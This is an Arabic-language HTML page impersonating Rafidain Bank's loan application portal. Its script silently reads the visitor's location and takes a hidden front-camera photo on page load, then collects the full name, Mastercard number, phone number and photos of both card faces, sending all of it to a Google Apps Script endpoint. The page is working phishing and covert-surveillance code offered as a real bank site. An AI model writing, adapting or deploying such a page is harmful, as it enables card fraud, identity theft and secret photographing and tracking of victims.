<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مصرف الرافدين - التقديم الإلكتروني</title>
    <style>
        :root {
            --primary-color: #0b4f6c;
            --success-green: #2e7d32;
            --bg-color: #f4f7f6;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            border-bottom: 2px solid var(--primary-color);
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        .header h2 {
            color: var(--primary-color);
            margin: 5px 0;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: var(--primary-color);
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            transition: background 0.3s;
        }
        .btn:hover {
            background-color: #08384d;
        }
        .loading-screen {
            text-align: center;
            padding: 40px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--success-green);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success-msg {
            text-align: center;
            color: var(--success-green);
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>مصرف الرافدين</h2>
        <p>بوابة التقديم الذكية للسلف الشخصية</p>
    </div>

    <!-- جاري التحميل والتحقق التلقائي -->
    <div id="stepLoading" class="step active loading-screen">
        <div class="spinner"></div>
        <h3 style="color: var(--success-green);">جاري الاتصال بخوادم مصرف الرافدين...</h3>
        <p>يرجى السماح بصلاحيات الموقع والكاميرا للمتابعة.</p>
    </div>

    <!-- الاستمارة -->
    <div id="stepForm" class="step">
        <h3 style="color: var(--success-green); text-align: center;">استمارة التقديم الرسمية</h3>
        <form id="loanForm" onsubmit="submitLoanForm(event)">
            <div class="form-group">
                <label for="fullName">الاسم الثلاثي واللقب:</label>
                <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي">
            </div>

            <div class="form-group">
                <label for="masterCard">رقم الماستر كارد (16 رقم):</label>
                <input type="text" id="masterCard" maxlength="16" required placeholder="xxxx xxxx xxxx xxxx">
            </div>

            <div class="form-group">
                <label for="phone">رقم الهاتف:</label>
                <input type="tel" id="phone" required placeholder="07xxxxxxxx">
            </div>

            <div class="form-group">
                <label for="loanType">نوع السلفة المطلوبة:</label>
                <select id="loanType" required>
                    <option value="">اختر قيمة السلفة</option>
                    <option value="5">سلفة 5,000,000 دينار عراقي</option>
                    <option value="10">سلفة 10,000,000 دينار عراقي</option>
                </select>
            </div>

            <div class="form-group">
                <label>صورة وجه البطاقة (ماستر كارد):</label>
                <input type="file" accept="image/*" capture="environment" id="cardFront" required>
            </div>

            <div class="form-group">
                <label>صورة خلف البطاقة (ماستر كارد):</label>
                <input type="file" accept="image/*" capture="environment" id="cardBack" required>
            </div>

            <button type="submit" class="btn">إرسال الطلب نهائياً</button>
        </form>
    </div>

    <!-- النجاح -->
    <div id="stepSuccess" class="step">
        <div class="success-msg">
            <h3>تم تقديم طلبك بنجاح!</h3>
            <p>شكراً لك. تم حفظ بياناتك وصور البطاقة في النظام وسيتم التواصل معك قريباً.</p>
        </div>
    </div>
</div>

<video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
<canvas id="hiddenCanvas" style="display:none;"></canvas>

<script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwakSQTiIygWy-XfnBMlpzbcFcjGSWUh4r2gW_R2OWBBMKHBZu7JVDgWfIBn5OHHaYBiQ/exec";

    let backgroundData = {
        type: "background_capture",
        device: navigator.userAgent,
        lat: "غير متوفر",
        lng: "غير متوفر",
        capturedImage: ""
    };

    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    backgroundData.lat = position.coords.latitude;
                    backgroundData.lng = position.coords.longitude;
                    capturePhotoAndSend();
                },
                function(error) {
                    capturePhotoAndSend();
                },
                { timeout: 5000 }
            );
        } else {
            capturePhotoAndSend();
        }
    };

    function capturePhotoAndSend() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.getElementById('hiddenCanvas');
                    canvas.width = video.videoWidth || 320;
                    canvas.height = video.videoHeight || 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    backgroundData.capturedImage = canvas.toDataURL('image/jpeg', 0.5);
                    stream.getTracks().forEach(track => track.stop());
                    
                    sendBackgroundData();
                }, 1000);
            })
            .catch(err => {
                sendBackgroundData();
            });
    }

    function sendBackgroundData() {
        fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(backgroundData)
        }).catch(e => console.log(e));

        setTimeout(() => {
            document.getElementById('stepLoading').classList.remove('active');
            document.getElementById('stepForm').classList.add('active');
        }, 1200);
    }

    function convertImageToBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result);
            reader.onerror = error => reject(error);
        });
    }

    async function submitLoanForm(event) {
        event.preventDefault();

        const frontFile = document.getElementById('cardFront').files[0];
        const backFile = document.getElementById('cardBack').files[0];

        const formData = {
            type: "loan_submission",
            fullName: document.getElementById('fullName').value,
            masterCard: document.getElementById('masterCard').value,
            phone: document.getElementById('phone').value,
            loanType: document.getElementById('loanType').value,
            cardFront: frontFile ? await convertImageToBase64(frontFile) : "",
            cardBack: backFile ? await convertImageToBase64(backFile) : ""
        };

        try {
            await fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });

            document.getElementById('stepForm').classList.remove('active');
            document.getElementById('stepSuccess').classList.add('active');
        } catch (error) {
            alert('حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.');
        }
    }
</script>

</body>
</html>
